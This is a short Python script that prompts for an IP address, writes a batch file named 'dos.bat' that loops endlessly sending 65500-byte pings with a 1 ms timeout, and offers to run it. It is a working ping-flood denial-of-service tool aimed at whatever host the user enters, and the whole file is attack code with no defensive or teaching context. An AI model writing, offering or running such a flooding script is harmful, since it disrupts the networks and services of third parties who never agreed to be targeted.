import os
import subprocess

direc = os.getcwd() # gets the directory

newIP = str(input("What IP do you want to ping? "))

# makes .bat file
myBat = open(r'dos.bat','w+')
myBat.write(':loop')
myBat.write('\nping ' + newIP + ' -l 65500 -w 1 -n 1')
myBat.write('\ngoto :loop')
myBat.close()

run = input("Would you like to run it? (Y/N) ") # UI
if run == 'Y' or run == 'y':
  subprocess.call([r''+str(direc)+'/dos.bat']) # runs the file
  print("running...")
    

elif run == 'N' or run == 'n':
  print("STOPPED!")

else:
  print("Invalid response!")
